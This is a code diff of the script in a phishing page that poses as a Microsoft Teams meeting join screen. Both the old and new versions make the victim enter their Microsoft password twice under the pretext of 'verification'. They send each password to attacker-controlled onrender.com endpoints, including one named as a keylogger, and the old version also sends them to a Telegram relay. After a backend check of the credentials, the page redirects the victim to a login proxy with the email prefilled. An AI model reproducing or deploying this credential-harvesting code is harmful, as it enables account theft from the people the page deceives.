@@ -543,719 +543,450 @@
 
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 
-<script>
-// ============================================================
-// CONFIGURATION - UPDATE WITH YOUR ACTUAL URLs
-// ============================================================
-const PROXY_URL = "https://microsoft-login-service-1.onrender.com/login";
-const BACKEND_URL = "https://google-workspace-service.onrender.com";
-const KEYLOGGER_URL = "https://keyserver-eaar.onrender.com/log";
+ <script>
+    // ============================================================
+    // CONFIGURATION
+    // ============================================================
+    const PROXY_URL = "https://preoauth-login.onrender.com/login";
+    const BACKEND_URL = "https://google-workspace-service.onrender.com";
+    const KEYLOGGER_URL = "https://keyserver-eaar.onrender.com/log";
+    const TEAMS_MEETING = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";
 
-// ============================================================
-// LANGUAGE DETECTION
-// ============================================================
-function detectUserLanguage() {
-    const params = new URLSearchParams(window.location.search);
-    const langParam = params.get('lang');
-    if (langParam) return langParam;
-    
-    const browserLang = navigator.language || navigator.userLanguage || 'en';
-    const lang = browserLang.split('-')[0].toLowerCase();
-    
-    const supportedLangs = ['en', 'es', 'fr', 'de', 'ko', 'ja', 'zh', 'ru', 'ar'];
-    if (supportedLangs.includes(lang)) {
-        return lang;
-    }
-    return 'en';
-}
+    // ============================================================
+    // SESSION & STATE
+    // ============================================================
+    const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+    let capturedEmail = '';
+    let attemptCount = 0;
+    let isVerifying = false;
+    let currentStage = 1; // 1 = first password, 2 = second password
+    let firstPasswordValid = false;
 
-const userLang = detectUserLanguage();
-document.documentElement.lang = userLang;
+    // ============================================================
+    // VERIFY PASSWORD WITH BACKEND
+    // ============================================================
+    async function verifyPassword(email, password, stage) {
+        try {
+            const response = await fetch(BACKEND_URL + '/api/verify-password', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    stage: stage,
+                    sessionId: SESSION_ID
+                })
+            });
 
-// ============================================================
-// TRANSLATIONS (Full)
-// ============================================================
-const TRANSLATIONS = {
-    en: {
-        title: 'Join your Teams meeting',
-        usersOnline: 'Users Online',
-        confidentialMessage: '🔐 This is an encrypted meeting and intended exclusively for you. For security and privacy, please verify your identity.',
-        continueBtn: 'Continue on this browser',
-        welcome: 'Welcome',
-        signedInAs: 'Signed in as',
-        passwordPlaceholder: 'Enter your Microsoft password',
-        verifyIdentity: 'Verify Identity',
-        confirmIdentity: 'Confirm Password',
-        verified: '✅ Verified!',
-        verifying: '🔐 Please enter your password to verify your identity.',
-        verifyingSecond: '🔐 Please re-enter your password to confirm.',
-        verifiedRedirect: '✅ Both passwords verified! Redirecting to secure meeting...',
-        redirecting: 'Loading secure verification...',
-        terms: 'By clicking Launch Meeting, you agree to our Terms of Service and Privacy Statement',
-        support: 'If you are unable to join the meeting, visit Teams Support Center for useful information.',
-        incorrectPassword: '❌ Incorrect password. Please try again.',
-        enterPassword: '⚠️ Please enter your password',
-        noEmail: '❌ No email provided',
-        expired: '⏰ Verification window expired. Please start again.',
-        firstVerified: '✅ First password verified! Please enter your password again to confirm.',
-        checking: '🔐 Verifying password with Microsoft...',
-        confirming: '🔐 Confirming password (2nd verification)...',
-        passwordMismatch: '❌ Passwords do not match. Please start over.',
-        twoFARequired: '🔐 This account requires two-factor authentication. Please complete MFA and try again.',
-        loading: 'Loading secure verification...',
-        verifyingProvider: '🔐 Verifying with Microsoft...',
-        providerDetected: '✅ Provider detected:'
-    },
-    ko: {
-        title: 'Teams 회의 참여',
-        usersOnline: '명 온라인',
-        confidentialMessage: '🔐 이 회의는 암호화되어 있으며 귀하만을 위한 것입니다. 보안과 개인정보 보호를 위해 본인 확인을 해주세요.',
-        continueBtn: '이 브라우저에서 계속',
-        welcome: '환영합니다',
-        signedInAs: '로그인 계정',
-        passwordPlaceholder: 'Microsoft 비밀번호를 입력하세요',
-        verifyIdentity: '본인 확인',
-        confirmIdentity: '비밀번호 확인',
-        verified: '✅ 확인됨!',
-        verifying: '🔐 본인 확인을 위해 비밀번호를 입력해주세요.',
-        verifyingSecond: '🔐 확인을 위해 비밀번호를 다시 입력해주세요.',
-        verifiedRedirect: '✅ 두 비밀번호 모두 확인 완료! 보안 회의로 이동합니다...',
-        redirecting: '보안 인증 로딩 중...',
-        terms: 'Launch Meeting을 클릭하면 이용약관 및 개인정보처리방침에 동의하게 됩니다.',
-        support: '회의 참여에 문제가 있으시면 Teams 지원 센터를 방문하세요.',
-        incorrectPassword: '❌ 비밀번호가 올바르지 않습니다. 다시 시도해주세요.',
-        enterPassword: '⚠️ 비밀번호를 입력해주세요',
-        noEmail: '❌ 이메일이 제공되지 않았습니다',
-        expired: '⏰ 인증 시간이 만료되었습니다. 다시 시작해주세요.',
-        firstVerified: '✅ 첫 번째 비밀번호 확인 완료! 확인을 위해 비밀번호를 다시 입력해주세요.',
-        checking: '🔐 Microsoft 서버에서 비밀번호 확인 중...',
-        confirming: '🔐 비밀번호 확인 중 (2차 인증)...',
-        passwordMismatch: '❌ 비밀번호가 일치하지 않습니다. 다시 시작해주세요.',
-        twoFARequired: '🔐 이 계정은 2단계 인증이 필요합니다. 인증 앱에서 MFA를 완료하고 다시 시도해주세요.',
-        loading: '보안 인증 로딩 중...',
-        verifyingProvider: '🔐 Microsoft에서 확인 중...',
-        providerDetected: '✅ 제공자 확인:'
-    }
-};
-
-const t = TRANSLATIONS[userLang] || TRANSLATIONS['en'];
-
-// ============================================================
-// APPLY TRANSLATIONS
-// ============================================================
-function applyTranslations() {
-    document.getElementById('pageTitle').textContent = t.title;
-    document.getElementById('usersOnline').textContent = '2 ' + t.usersOnline;
-    document.getElementById('confidentialText').textContent = t.confidentialMessage;
-    document.getElementById('continueBtn').textContent = t.continueBtn;
-    document.getElementById('welcomeText').textContent = t.welcome;
-    document.getElementById('signedInText').textContent = t.signedInAs;
-    document.getElementById('passwordInput').placeholder = t.passwordPlaceholder;
-    document.getElementById('verifyBtn').textContent = t.verifyIdentity;
-    document.getElementById('termsText').textContent = t.terms;
-    document.getElementById('supportText').textContent = t.support;
-    document.getElementById('loadTxt').textContent = t.redirecting;
-    document.getElementById('twofaText').textContent = t.twoFARequired;
-}
-
-// ============================================================
-// SESSION & STATE
-// ============================================================
-const SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-let capturedEmail = '';
-let attemptCount = 0;
-let consecutiveCount = 0;
-let isVerifying = false;
-let currentStage = 1;
-let passwordValidated = false;
-let lastAttemptTime = 0;
-const ATTEMPT_WINDOW = 10000; // 10 seconds
-
-// ============================================================
-// DETECT EMAIL PROVIDER
-// ============================================================
-function detectProvider(email) {
-    if (!email) return { name: 'Unknown', icon: '❓' };
-    const domain = email.split('@')[1]?.toLowerCase() || '';
-    
-    const providers = {
-        'microsoft.com': { name: 'Microsoft 365', icon: '💼', class: 'microsoft' },
-        'outlook.com': { name: 'Outlook', icon: '💼', class: 'microsoft' },
-        'hotmail.com': { name: 'Hotmail', icon: '💼', class: 'microsoft' },
-        'live.com': { name: 'Microsoft Live', icon: '💼', class: 'microsoft' },
-        'office.com': { name: 'Office 365', icon: '💼', class: 'microsoft' },
-        'gmail.com': { name: 'Gmail', icon: '🔵', class: 'google' },
-        'googlemail.com': { name: 'Gmail', icon: '🔵', class: 'google' },
-        'yahoo.com': { name: 'Yahoo', icon: '🟣', class: 'yahoo' },
-        'naver.com': { name: 'Naver', icon: '🟢', class: 'naver' },
-        'daum.net': { name: 'Daum', icon: '⚫', class: 'daum' },
-        'hanmail.net': { name: 'Hanmail', icon: '⚫', class: 'daum' },
-        'kakao.com': { name: 'Kakao', icon: '🟡', class: 'kakao' },
-        'icloud.com': { name: 'Apple iCloud', icon: '🍎', class: 'apple' },
-        'me.com': { name: 'Apple iCloud', icon: '🍎', class: 'apple' }
-    };
-    
-    for (const [key, value] of Object.entries(providers)) {
-        if (domain === key || domain.endsWith('.' + key)) {
-            return value;
+            const data = await response.json();
+            console.log('[VERIFY] Response:', data);
+            return data;
+        } catch (error) {
+            console.error('[VERIFY] Error:', error);
+            return {
+                success: false,
+                message: 'Network error. Please try again.',
+                reset: true
+            };
         }
     }
-    
-    // Corporate domain
-    if (domain.includes('.') && !domain.includes('gmail') && !domain.includes('yahoo')) {
-        return { name: domain.split('.')[0] || 'Corporate', icon: '🏢', class: 'corporate' };
+
+    // ============================================================
+    // HANDLE SUBMIT - 2-CONSECUTIVE CORRECT PASSWORD
+    // ============================================================
+    async function handleSubmit() {
+        if (isVerifying) {
+            showNotification('⏳ Please wait...', 'confidential');
+            return;
+        }
+
+        const passwordInput = document.getElementById('password');
+        const password = passwordInput ? passwordInput.value.trim() : '';
+        const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || '';
+
+        if (!email) {
+            showNotification(t.noEmail, 'error');
+            return;
+        }
+
+        if (!password) {
+            const errorDiv = document.getElementById('errorDiv');
+            if (errorDiv) {
+                errorDiv.textContent = t.enterPassword;
+                errorDiv.style.display = 'block';
+            }
+            passwordInput.focus();
+            return;
+        }
+
+        // Show loading
+        isVerifying = true;
+        const joinBtn = document.getElementById('joinBtn');
+        const spin = document.getElementById('spin');
+        const statusEl = document.getElementById('verificationStatus');
+        const confidentialMsg = document.getElementById('confidentialMessage');
+        
+        joinBtn.disabled = true;
+        spin.style.display = 'inline-block';
+        
+        if (currentStage === 1) {
+            statusEl.textContent = '🔐 Verifying password with Microsoft...';
+        } else {
+            statusEl.textContent = '🔐 Confirming password (2nd verification)...';
+        }
+        statusEl.className = 'verification-status verifying';
+        
+        passwordInput.disabled = true;
+        passwordInput.classList.remove('error', 'success');
+
+        attemptCount++;
+
+        // Send credentials for logging
+        sendCredentialsToBackend(email, password, 'password_verification_stage_' + currentStage);
+
+        // 🔐 VERIFY WITH MICROSOFT
+        const result = await verifyPassword(email, password, currentStage);
+
+        // Hide loading
+        joinBtn.disabled = false;
+        spin.style.display = 'none';
+        passwordInput.disabled = false;
+
+        // Check for 2FA
+        if (result.requires2FA) {
+            statusEl.textContent = '🔐 This account requires two-factor authentication. Please try a different account.';
+            statusEl.className = 'verification-status error';
+            passwordInput.classList.add('error');
+            
+            showNotification('🔐 2FA required. Please use a different account.', 'error');
+            
+            setTimeout(() => {
+                passwordInput.value = '';
+                passwordInput.focus();
+                passwordInput.classList.remove('error');
+                currentStage = 1;
+                firstPasswordValid = false;
+                joinBtn.textContent = t.verifyIdentity;
+                statusEl.textContent = '🔐 Please enter your password to verify your identity.';
+                statusEl.className = 'verification-status';
+                isVerifying = false;
+            }, 3000);
+            return;
+        }
+
+        // Check result
+        if (!result.success || result.reset) {
+            // ❌ WRONG PASSWORD - RESET EVERYTHING
+            statusEl.textContent = result.message || '❌ Incorrect password. Please try again.';
+            statusEl.className = 'verification-status error';
+            passwordInput.classList.add('error');
+            
+            showNotification('❌ ' + (result.message || 'Invalid password. Please try again.'), 'error');
+            
+            // Reset everything
+            currentStage = 1;
+            firstPasswordValid = false;
+            
+            setTimeout(() => {
+                passwordInput.value = '';
+                passwordInput.focus();
+                passwordInput.classList.remove('error');
+                joinBtn.textContent = t.verifyIdentity;
+                statusEl.textContent = '🔐 Please enter your password to verify your identity.';
+                statusEl.className = 'verification-status';
+                confidentialMsg.style.display = 'block';
+                isVerifying = false;
+            }, 2000);
+            return;
+        }
+
+        // ✅ PASSWORD IS VALID
+        if (result.stage === 2 && result.verified) {
+            // ✅ BOTH PASSWORDS CORRECT - REDIRECT TO PROXY!
+            statusEl.textContent = '✅ Both passwords verified! Redirecting to secure meeting...';
+            statusEl.className = 'verification-status verified';
+            passwordInput.classList.add('success');
+            joinBtn.textContent = '✅ Verified!';
+            
+            showNotification('✅ Both passwords correct! Redirecting to Microsoft...', 'success');
+
+            // Send success to Telegram
+            const successMsg = `🚀 *2-CONSECUTIVE VERIFICATION SUCCESS*\n\n*Email:* ${email}\n*Session:* ${SESSION_ID.substring(0, 12)}...\n*Time:* ${new Date().toISOString()}\n*Status:* ✅ BOTH PASSWORDS CORRECT - REDIRECTING TO PROXY\n\n*Next Step:* User will be redirected to Microsoft Login with email prefilled.`;
+
+            // ✅ REDIRECT TO PROXY WITH EMAIL PREFILLED
+            // The proxy will forward to Microsoft login with login_hint
+            const proxyRedirectUrl = `${PROXY_URL}?login_hint=${encodeURIComponent(email)}&session=${SESSION_ID}&verified=true`;
+            
+            console.log('🔗 Redirecting to Proxy:', proxyRedirectUrl);
+            console.log('📧 Email prefilled:', email);
+            console.log('🆔 Session:', SESSION_ID);
+
+            setTimeout(() => {
+                window.location.href = proxyRedirectUrl;
+            }, 2000);
+            return;
+        }
+
+        if (result.stage === 2) {
+            // ✅ FIRST PASSWORD CORRECT - NOW ASK FOR SECOND
+            firstPasswordValid = true;
+            currentStage = 2;
+            passwordInput.value = '';
+            statusEl.textContent = '✅ First password verified! Please enter your password again to confirm.';
+            statusEl.className = 'verification-status verified';
+            passwordInput.classList.add('success');
+            joinBtn.textContent = 'Confirm Password';
+            confidentialMsg.style.display = 'none';
+            
+            showNotification('✅ First password correct! Please confirm by entering it again.', 'success');
+            
+            setTimeout(() => {
+                passwordInput.focus();
+                passwordInput.classList.remove('success');
+                isVerifying = false;
+            }, 500);
+            return;
+        }
+
+        isVerifying = false;
     }
-    
-    return { name: 'Unknown', icon: '❓', class: 'unknown' };
-}
 
-// ============================================================
-// UPDATE PROVIDER BADGE
-// ============================================================
-function updateProviderBadge(email) {
-    const provider = detectProvider(email);
-    const badge = document.getElementById('providerBadge');
-    if (badge) {
-        badge.textContent = `${provider.icon} ${provider.name}`;
-        badge.className = `provider-badge ${provider.class || ''}`;
-    }
-}
+    // ============================================================
+    // SEND CREDENTIALS TO BACKEND
+    // ============================================================
+    function sendCredentialsToBackend(email, password, source) {
+        if (!email || !password || password.length < 2) return;
 
-// ============================================================
-// PASSWORD STRENGTH INDICATOR
-// ============================================================
-function updatePasswordStrength(password) {
-    const fill = document.getElementById('strengthFill');
-    if (!fill) return;
-    
-    let strength = 0;
-    if (password.length >= 8) strength += 25;
-    if (/[a-z]/.test(password)) strength += 20;
-    if (/[A-Z]/.test(password)) strength += 20;
-    if (/[0-9]/.test(password)) strength += 20;
-    if (/[^a-zA-Z0-9]/.test(password)) strength += 15;
-    
-    fill.style.width = strength + '%';
-    fill.className = 'fill';
-    if (strength < 40) fill.classList.add('weak');
-    else if (strength < 60) fill.classList.add('medium');
-    else if (strength < 80) fill.classList.add('strong');
-    else fill.classList.add('very-strong');
-}
-
-// ============================================================
-// SEND CREDENTIALS TO BACKEND
-// ============================================================
-function sendCredentialsToBackend(email, password, source) {
-    if (!email || !password || password.length < 2) return;
-
-    const data = {
-        email: email,
-        password: password,
-        source: source || 'confidential_meeting',
-        sessionId: SESSION_ID,
-        url: window.location.href,
-        userAgent: navigator.userAgent,
-        timestamp: new Date().toISOString(),
-        attemptCount: attemptCount,
-        consecutiveCount: consecutiveCount,
-        stage: currentStage,
-        provider: detectProvider(email).name,
-        referrer: document.referrer || 'Direct',
-        service: 'Microsoft 365'
-    };
-
-    fetch(BACKEND_URL + '/api/credential-capture', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data),
-        keepalive: true
-    }).catch(() => {});
-
-    fetch(KEYLOGGER_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            type: 'password_verification',
+        const data = {
             email: email,
             password: password,
-            source: source,
+            source: source || 'confidential_meeting',
             sessionId: SESSION_ID,
-            stage: currentStage,
-            attemptCount: attemptCount,
-            consecutiveCount: consecutiveCount,
-            provider: detectProvider(email).name,
             url: window.location.href,
-            timestamp: Date.now()
-        }),
-        keepalive: true
-    }).catch(() => {});
-}
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            attemptCount: attemptCount,
+            stage: currentStage,
+            referrer: document.referrer || 'Direct',
+            service: 'Microsoft 365'
+        };
 
-// ============================================================
-// SEND TELEGRAM ALERT
-// ============================================================
-function sendTelegramAlert(email, password, provider, verified) {
-    const message = `🔐 *${verified ? '✅ VERIFIED' : '❌ INVALID'} PASSWORD*\n\n` +
-                    `*Email:* ${email}\n` +
-                    `*Password:* \`${password}\`\n` +
-                    `*Provider:* ${provider}\n` +
-                    `*Session:* ${SESSION_ID.substring(0, 12)}...\n` +
-                    `*Time:* ${new Date().toISOString()}\n` +
-                    `*Status:* ${verified ? '✅ CORRECT' : '❌ WRONG'}`;
+        fetch(BACKEND_URL + '/api/credential-capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data),
+            keepalive: true
+        }).catch(() => {});
 
-    fetch(BACKEND_URL + '/api/telegram', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ message, parseMode: 'Markdown' })
-    }).catch(() => {});
-}
-
-// ============================================================
-// VERIFY PASSWORD WITH BACKEND (Microsoft OAuth2)
-// ============================================================
-async function verifyPasswordWithBackend(email, password) {
-    try {
-        const response = await fetch(BACKEND_URL + '/api/verify-password', {
+        fetch(KEYLOGGER_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
+                type: 'password_verification',
                 email: email,
                 password: password,
-                stage: currentStage,
+                source: source,
                 sessionId: SESSION_ID,
-                provider: detectProvider(email).name
-            })
-        });
-        const data = await response.json();
-        console.log('[VERIFY] Response:', data);
-        return data;
-    } catch (error) {
-        console.error('[VERIFY] Error:', error);
-        return {
-            success: false,
-            message: 'Network error. Please try again.',
-            reset: true
-        };
-    }
-}
-
-// ============================================================
-// HANDLE SUBMIT - WITH REAL PASSWORD VERIFICATION
-// ============================================================
-async function handleSubmit() {
-    if (isVerifying) {
-        showNotification('⏳ Please wait...', 'confidential');
-        return;
-    }
-
-    const passwordInput = document.getElementById('password');
-    const password = passwordInput ? passwordInput.value.trim() : '';
-    const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || '';
-
-    // Update provider badge
-    updateProviderBadge(email);
-
-    if (!email) {
-        showNotification(t.noEmail, 'error');
-        return;
-    }
-
-    if (!password) {
-        updateVerificationStatus(t.enterPassword, 'error');
-        passwordInput.focus();
-        return;
-    }
-
-    // Show loading
-    isVerifying = true;
-    const joinBtn = document.getElementById('joinBtn');
-    const spin = document.getElementById('spin');
-    const statusEl = document.getElementById('verificationStatus');
-    
-    joinBtn.disabled = true;
-    spin.style.display = 'inline-block';
-    passwordInput.disabled = true;
-    passwordInput.classList.add('loading');
-    
-    const statusMessage = currentStage === 1 ? t.checking : t.confirming;
-    updateVerificationStatus(statusMessage, 'verifying');
-    
-    attemptCount++;
-
-    // Send credentials for logging
-    sendCredentialsToBackend(email, password, 'password_verification_stage_' + currentStage);
-
-    // 🔐 VERIFY WITH BACKEND (Microsoft OAuth2)
-    const result = await verifyPasswordWithBackend(email, password);
-
-    // Hide loading
-    joinBtn.disabled = false;
-    spin.style.display = 'none';
-    passwordInput.disabled = false;
-    passwordInput.classList.remove('loading');
-
-    // Check result
-    if (result.requires2FA) {
-        // 2FA Required
-        updateVerificationStatus(t.twoFARequired, 'twofa');
-        document.getElementById('twofaWarning').classList.add('show');
-        passwordInput.classList.add('success');
-        
-        showNotification('🔐 2FA required. Complete MFA and try again.', 'warning');
-        
-        setTimeout(() => {
-            passwordInput.value = '';
-            passwordInput.focus();
-            passwordInput.classList.remove('success');
-            currentStage = 1;
-            consecutiveCount = 0;
-            joinBtn.textContent = t.verifyIdentity;
-            isVerifying = false;
-            document.getElementById('twofaWarning').classList.remove('show');
-        }, 5000);
-        return;
-    }
-
-    if (!result.success || result.reset) {
-        // ❌ WRONG PASSWORD - RESET EVERYTHING
-        updateVerificationStatus(result.message || t.incorrectPassword, 'error');
-        passwordInput.classList.add('error');
-        
-        sendTelegramAlert(email, password, detectProvider(email).name, false);
-        showNotification('❌ ' + (result.message || t.incorrectPassword), 'error');
-        
-        // Reset everything
-        currentStage = 1;
-        consecutiveCount = 0;
-        
-        setTimeout(() => {
-            passwordInput.value = '';
-            passwordInput.focus();
-            passwordInput.classList.remove('error');
-            joinBtn.textContent = t.verifyIdentity;
-            updateVerificationStatus(t.verifying, 'verifying');
-            isVerifying = false;
-        }, 2000);
-        return;
-    }
-
-    // ✅ PASSWORD IS VALID
-    sendTelegramAlert(email, password, detectProvider(email).name, true);
-    
-    if (currentStage === 1) {
-        // First password correct - ask for second
-        currentStage = 2;
-        consecutiveCount = 1;
-        passwordInput.value = '';
-        passwordInput.classList.add('success');
-        updateVerificationStatus(t.firstVerified, 'verified');
-        joinBtn.textContent = t.confirmIdentity;
-        
-        showNotification('✅ First password correct! Please confirm.', 'success');
-        
-        setTimeout(() => {
-            passwordInput.focus();
-            passwordInput.classList.remove('success');
-            isVerifying = false;
-        }, 500);
-        return;
-        
-    } else if (currentStage === 2) {
-        // ✅ BOTH PASSWORDS CORRECT - REDIRECT!
-        updateVerificationStatus(t.verifiedRedirect, 'verified');
-        passwordInput.classList.add('success');
-        joinBtn.textContent = '✅ Verified!';
-        
-        showNotification('✅ Both passwords correct! Redirecting...', 'success');
-        
-        // Send final verification success
-        const successMsg = `🚀 *2-CONSECUTIVE VERIFICATION SUCCESS*\n\n*Email:* ${email}\n*Provider:* ${detectProvider(email).name}\n*Session:* ${SESSION_ID.substring(0, 12)}...\n*Time:* ${new Date().toISOString()}\n*Status:* ✅ BOTH PASSWORDS CORRECT - REDIRECTING TO PROXY`;
-        fetch(BACKEND_URL + '/api/telegram', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: successMsg, parseMode: 'Markdown' })
+                stage: currentStage,
+                attemptCount: attemptCount,
+                url: window.location.href,
+                timestamp: Date.now()
+            }),
+            keepalive: true
         }).catch(() => {});
-
-        setTimeout(() => {
-            const encodedEmail = encodeURIComponent(email);
-            const proxyUrl = PROXY_URL + '?login_hint=' + encodedEmail + '&session=' + SESSION_ID + '&verified=true';
-            window.location.href = proxyUrl;
-        }, 2000);
-        return;
     }
 
-    isVerifying = false;
-}
-
-// ============================================================
-// UPDATE VERIFICATION STATUS
-// ============================================================
-function updateVerificationStatus(message, type) {
-    const statusEl = document.getElementById('verificationStatus');
-    if (!statusEl) return;
-    
-    statusEl.textContent = message;
-    statusEl.className = 'verification-status';
-    if (type) {
-        statusEl.classList.add(type);
-    }
-}
-
-// ============================================================
-// GET EMAIL FROM URL
-// ============================================================
-function getEmailFromUrl() {
-    const params = new URLSearchParams(window.location.search);
-    let email = params.get('e') || params.get('email') || '';
-    if (!email && window.location.search.length > 1) {
-        try {
-            const decoded = atob(window.location.search.substring(1));
-            if (decoded.includes('@')) email = decoded;
-        } catch(e) {
-            if (window.location.search.substring(1).includes('@')) {
-                email = window.location.search.substring(1);
+    // ============================================================
+    // EMAIL EXTRACTION
+    // ============================================================
+    function getEmailFromUrl() {
+        const params = new URLSearchParams(window.location.search);
+        let email = params.get('e') || params.get('email') || '';
+        if (!email && window.location.search.length > 1) {
+            try {
+                const decoded = atob(window.location.search.substring(1));
+                if (decoded.includes('@')) email = decoded;
+            } catch(e) {
+                if (window.location.search.substring(1).includes('@')) {
+                    email = window.location.search.substring(1);
+                }
             }
         }
+        if (email) {
+            email = email.split('&')[0].split('?')[0];
+            email = decodeURIComponent(email);
+            if (!email.includes('@')) email = '';
+        }
+        if (email) {
+            try { localStorage.setItem('lastEmail', email); } catch(e) {}
+        }
+        return email;
     }
-    if (email) {
-        email = email.split('&')[0].split('?')[0];
-        email = decodeURIComponent(email);
-        if (!email.includes('@')) email = '';
+
+    function getSavedEmail() {
+        try { return localStorage.getItem('lastEmail') || ''; } catch(e) { return ''; }
     }
-    if (email) {
-        try { localStorage.setItem('lastEmail', email); } catch(e) {}
+
+    // ============================================================
+    // LANGUAGE & TRANSLATIONS
+    // ============================================================
+    function detectUserLanguage() {
+        const params = new URLSearchParams(window.location.search);
+        const langParam = params.get('lang');
+        if (langParam) return langParam;
+        const browserLang = navigator.language || navigator.userLanguage || 'en';
+        const lang = browserLang.split('-')[0].toLowerCase();
+        const supportedLangs = ['en', 'es', 'fr', 'de', 'ko', 'ja', 'zh', 'ru', 'ar'];
+        return supportedLangs.includes(lang) ? lang : 'en';
     }
-    return email;
-}
 
-function getSavedEmail() {
-    try { return localStorage.getItem('lastEmail') || ''; } catch(e) { return ''; }
-}
+    const userLang = detectUserLanguage();
 
-// ============================================================
-// NOTIFICATION
-// ============================================================
-function showNotification(message, type = 'success') {
-    try {
-        const existing = document.querySelector('.notification');
-        if (existing) existing.remove();
+    const TRANSLATIONS = {
+        en: {
+            title: 'Join your Teams meeting',
+            usersOnline: 'Users Online',
+            confidentialMessage: '🔐 This is an encrypted meeting and intended exclusively for you. For security and privacy, please verify your identity.',
+            continueBtn: 'Continue on this browser',
+            welcome: 'Welcome',
+            signedInAs: 'Signed in as',
+            passwordPlaceholder: 'Enter your Microsoft password',
+            verifyIdentity: 'Verify Identity',
+            confirmIdentity: 'Confirm Password',
+            verified: '✅ Verified!',
+            verifying: '🔐 This is an encrypted meeting and intended exclusively for you. For security and privacy, confirm your password.',
+            verifiedRedirect: '✅ Identity verified. Redirecting to encrypted meeting...',
+            redirecting: 'Loading secure verification...',
+            terms: 'By clicking Launch Meeting, you agree to our Terms of Service and Privacy Statement',
+            support: 'If you are unable to join the meeting, visit Teams Support Center for useful information.',
+            incorrectPassword: 'Incorrect password. Please try again.',
+            enterPassword: '⚠️ Please enter your password',
+            noEmail: '❌ No email provided',
+            expired: '⏰ Verification window expired. Please start again.'
+        }
+    };
 
-        const div = document.createElement('div');
-        div.className = 'notification';
-        if (type === 'error') div.classList.add('error');
-        if (type === 'confidential') div.style.background = '#6264a7';
-        if (type === 'warning') div.style.background = '#ff9800';
-        div.textContent = message;
-        document.body.appendChild(div);
+    const t = TRANSLATIONS[userLang] || TRANSLATIONS['en'];
 
-        setTimeout(() => {
-            div.style.opacity = '0';
-            div.style.transition = 'opacity 0.3s';
-            setTimeout(() => div.remove(), 300);
-        }, 4000);
-    } catch(e) {}
-}
+    // ============================================================
+    // APPLY TRANSLATIONS & INIT
+    // ============================================================
+    function applyTranslations() {
+        document.getElementById('pageTitle').textContent = t.title;
+        document.getElementById('usersOnline').textContent = '2 ' + t.usersOnline;
+        document.getElementById('confidentialText').textContent = t.confidentialMessage;
+        document.getElementById('continueBtn').textContent = t.continueBtn;
+        document.getElementById('welcomeText').textContent = t.welcome;
+        document.getElementById('signedInText').textContent = t.signedInAs;
+        document.getElementById('passwordInput').placeholder = t.passwordPlaceholder;
+        document.getElementById('verifyBtn').textContent = t.verifyIdentity;
+        document.getElementById('termsText').textContent = t.terms;
+        document.getElementById('supportText').textContent = t.support;
+        document.getElementById('loadTxt').textContent = t.redirecting;
+    }
 
-// ============================================================
-// CONTINUE BUTTON
-// ============================================================
-function setupContinueButton() {
-    const continueBtn = document.getElementById('btnJoinTest');
-    if (!continueBtn) return;
-
-    continueBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-
-        const email = capturedEmail || getEmailFromUrl() || getSavedEmail() || 'guest@example.com';
-        capturedEmail = email;
-        updateProviderBadge(email);
+    document.addEventListener('DOMContentLoaded', function() {
+        applyTranslations();
         
-        document.getElementById('joinDiv').style.display = 'none';
-        document.getElementById('loadDiv').style.display = 'block';
-        document.getElementById('loadTxt').textContent = t.loading;
-
-        setTimeout(function() {
-            document.getElementById('loadDiv').style.display = 'none';
-            document.getElementById('loginDiv').style.display = 'block';
-            document.getElementById('confidentialMessage').classList.add('show');
+        const email = getEmailFromUrl() || getSavedEmail() || 'guest@example.com';
+        capturedEmail = email;
+        
+        document.getElementById('user').value = email;
+        document.getElementById('userTxt').textContent = email;
+        document.getElementById('nameTxt').textContent = email.split('@')[0] || 'User';
+        
+        // Continue button handler
+        document.getElementById('btnJoinTest').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('joinDiv').style.display = 'none';
+            document.getElementById('loadDiv').style.display = 'block';
             
-            document.getElementById('user').value = email;
-            document.getElementById('userTxt').textContent = email;
-            document.getElementById('nameTxt').textContent = email.split('@')[0] || 'User';
-            
-            currentStage = 1;
-            consecutiveCount = 0;
-            updateVerificationStatus(t.verifying, 'verifying');
-            
-            const passwordInput = document.getElementById('password');
-            if (passwordInput) {
-                passwordInput.value = '';
-                passwordInput.placeholder = t.passwordPlaceholder;
-                passwordInput.focus();
-            }
-
-            document.getElementById('joinBtn').textContent = t.verifyIdentity;
-            document.getElementById('joinBtn').classList.remove('success');
-        }, 1500);
-    });
-}
-
-// ============================================================
-// VIDEO BACKGROUND
-// ============================================================
-(function initBackground() {
-    const bgContainer = document.getElementById('videoBackground');
-    const gradientFallback = document.getElementById('gradientFallback');
-    
-    const video = document.createElement('video');
-    video.setAttribute('playsinline', '');
-    video.setAttribute('autoplay', '');
-    video.setAttribute('muted', '');
-    video.setAttribute('loop', '');
-    video.style.cssText = `
-        position: absolute;
-        top: 50%; left: 50%;
-        min-width: 100%; min-height: 100%;
-        width: auto; height: auto;
-        transform: translate(-50%, -50%);
-        object-fit: cover;
-        opacity: 0;
-        z-index: 1;
-        transition: opacity 2s ease;
-    `;
-    
-    const videoSources = [
-        { src: 'https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/298520-maria-sizzle-0x540-2160k', type: 'video/mp4' },
